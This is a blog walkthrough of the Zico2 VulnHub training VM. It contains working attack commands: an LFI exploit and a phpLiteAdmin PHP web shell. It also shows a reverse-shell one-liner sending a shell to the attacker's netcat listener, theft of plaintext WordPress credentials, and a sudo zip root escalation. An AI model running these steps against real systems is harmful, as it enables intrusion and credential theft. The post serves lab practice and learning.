---
layout: post
title:  "Zico2: Vulnhub Walkthrough"
date:   2018-05-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [Rafael][2] and is part of a series called `zico2`. Its graded as intermediate but I rank it as intermediate to hard. As this is purely for educational purposes I'll throw in spoilers now. Its got LFI, re-used credentials from an abandoned CMS and being an old VM at time of writing we can throw some kernel exploits at it. To exploit this machine we'll need to chain two different exploits. At the end we'll also include some mitigation strategies. Without much further ado here we go. Word from the author:

```
Zico's Shop: A Boot2Root Machine intended to simulate a real world scenario

Disclaimer:

By using this virtual machine, you agree that in no event will I be liable for any loss or
damage including without limitation, indirect or consequential loss or damage, or any loss or
damage whatsoever arising from loss of data or profits arising out of or in connection with the use of this software.

TL;DR - You are about to load up a virtual machine with vulnerabilities. If something bad happens, it's not my fault.

Level: Intermediate

Goal: Get root and read the flag file

Description:

Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?

Hint: Enumerate, enumerate, and enumerate!
```
<!--more-->
## Information Gathering
Find the port its running on if you don't have it;  
`arp-scan -l -I eth0`  
Add it to /etc/hosts;
``echo -e "192.168.227.140\zico" >> /etc/hosts``

![1.png](/assets/images/posts/zico-2-vulnhub-walkthrough/1.png)

We'll be using [nmapAutomator][4] a great tool for enumeration. It uses gobuster for bruteforce so make sure you have it. This will run in the background allow us to explore other aspects of the Box:  
Here are the results;
```
nmap -sV -O -p- -oN /root/oscp/exam/zico/zico.nmap zico
Nmap scan report for zico (192.168.109.128)
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
111/tcp   open  rpcbind 2-4 (RPC #100000)
35613/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:FD:3A:40 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 22 15:30:34 2018 -- 1 IP address (1 host up) scanned in 15.74 seconds
```
Navigate to the home page;
![2.png](/assets/images/posts/zico-2-vulnhub-walkthrough/2.png)

We can use the curl command to view the links on the page.
```
# curl zico -s -L | grep "src\|href" | sed -e 's/^[[:space:]]*//'
...
<a href="/view.php?page=tools.html" class="btn btn-default btn-xl sr-button">Check them out!</a>
...
```
or just check out the links on the page.
![3.png](/assets/images/posts/zico-2-vulnhub-walkthrough/3.png)

The link looks susceptible to LFI. Testing it out for directory traversal `http://192.168.109.143/view.php?page=../../etc/passwd`

```
# curl zico -s http://192.168.109.143/view.php?page=../../etc/passwd
root:x:0:0:root:/root:/bin/bash
...
zico:x:1000:1000:,,,:/home/zico:/bin/bash  
```
Port 80 is open we'll run gobuster to bruteforce the directories. You can run other tools like wfuzz, dirb, dirbuseter or dirsearch;

```
# /opt/gobuster/gobuster -u http://zico -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://zico/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2020/02/22 13:43:09 Starting gobuster
=====================================================
http://zico/.hta (Status: 403)
http://zico/.htpasswd (Status: 403)
http://zico/.htaccess (Status: 403)
http://zico/LICENSE (Status: 200)
http://zico/cgi-bin/ (Status: 403)
http://zico/css (Status: 301)
http://zico/dbadmin (Status: 301)
http://zico/img (Status: 301)
http://zico/index.html (Status: 200)
http://zico/index (Status: 200)
http://zico/js (Status: 301)
http://zico/package (Status: 200)
http://zico/server-status (Status: 403)
http://zico/tools (Status: 200)
http://zico/vendor (Status: 301)
http://zico/view (Status: 200)
=====================================================
2020/02/22 13:43:11 Finished
=====================================================
```
`http://zico/dbadmin (Status: 301)` looks interesting.
![4.png](/assets/images/posts/zico-2-vulnhub-walkthrough/4.png)
We find some  interesting directories.
Navigating to `test_db.php` we find phpliteadmin app v1.9.3. Quick search tells us this version is vulnerable.
```
# searchsploit phpliteadmin
------------------------------------------ ----------------------------------------
 Exploit Title                            |  Path
                                          | (/usr/share/exploitdb/)
------------------------------------------ ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Inje | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection      | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabiliti | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabili | exploits/php/webapps/39714.txt
------------------------------------------ ----------------------------------------
```
Log in with the default password `admin` as found on Google and we're in;

![5.png](/assets/images/posts/zico-2-vulnhub-walkthrough/5.png)

From here we can see the path to the database `/usr/databases/`. Hence the LFI found before will come in handy.
Here are the steps to launch the exploit;

1.Create a database with the .php extension e.g rs.php

![7.png](/assets/images/posts/zico-2-vulnhub-walkthrough/7.png)

2.Create a table with 1 field e.g pwn and write php code `<?php echo system($_REQUEST ["cmd"]); ?>` into it.

![10.png](/assets/images/posts/zico-2-vulnhub-walkthrough/10.png)

Cool now that we have our table created and we know we've got LFI, possibly code execution we go to `/view.php?page=../../usr/databases/rs.php&cmd=ls`
![11.png](/assets/images/posts/zico-2-vulnhub-walkthrough/11.png)

... and it works.

### Low privilege shell
Steps. Start the listener
```
# nc -lnvp 1234
```
In another window:
```
# curl -s http://192.168.109.143/view.php --data-urlencode "page=../../usr/databases/rs.php&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.109.140 1234 >/tmp/f"

```
Moving into the Kali VM.
```
root@marksmith:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.109.140] from (UNKNOWN) [192.168.109.143] 44106
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"

... here we do Ctrl+z
www-data@zico:/var/www$ ^Z
[1]+  Stopped                 nc -lnvp 1234
root@marksmith:~# stty raw -echo
... then fg

www-data@zico:/var/www$  stty rows 33  cols 133
```
We have a look at `view.php`; this is where the vulnerability lies. Since it's not appending any extension to the [Param] we could bruteforce for other files.

```
www-data@zico:/var/www$ cat view.php
<?php
        $page =$_GET['page'];
        include("/var/www/".$page);
?>
```

We go to `zico` home directory and look at wordpress;

```
www-data@zico:/var/www$ cd /home/zico
www-data@zico:/home/zico$ ls
bootstrap.zip                            to_do.txt          zico-history.tar.gz
joomla                                   wordpress
startbootstrap-business-casual-gh-pages  wordpress-4.8.zip

We find a wp-config.php in an abandoned wordpress installation thus hunt for usernames & passwords;

www-data@zico:/home/zico/wordpress$ grep -i 'user\|pass' wp-config.php
/** MySQL database username */
define('DB_USER', 'zico');
/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
```
Point to note we could also try, `grep -Ri 'user\|pass'`

## Privilege Escalation
Log in as zico with the creds from wp-config.php. These are in plain text so need to crack them;

```
www-data@zico:/home/zico/wordpress$ su - zico
Password:
zico@zico:~$ id
uid=1000(zico) gid=1000(zico) groups=1000(zico)
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```
### Getting shell using zip command
As seen above we can execute commands as root with no passwords using `/usr/bin/zip` and `/bin/tar`.

```
zico@zico:~$ sudo zip wordpress-4.8.zip wp.txt -T --unzip-command="sh -c /bin/bash"
updating: wp.txt (deflated 43%)
root@zico:~# id
uid=0(root) gid=0(root) groups=0(root)
root@zico:~# ls

root@zico:/# cd root/
root@zico:/root# ls
flag.txt
root@zico:/root# cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
#
# Hope you enjoyed!
#
#
#
#
```
We've got our flag.

### Using kernel exploit
Kernel Exploits That worked
```
[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131
```

## Mitigations
Use Mod Security and iptables to block connections out of the Box.

[1]: https://www.vulnhub.com/entry/zico2-1,210/
[2]: https://twitter.com/@rafasantos5
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
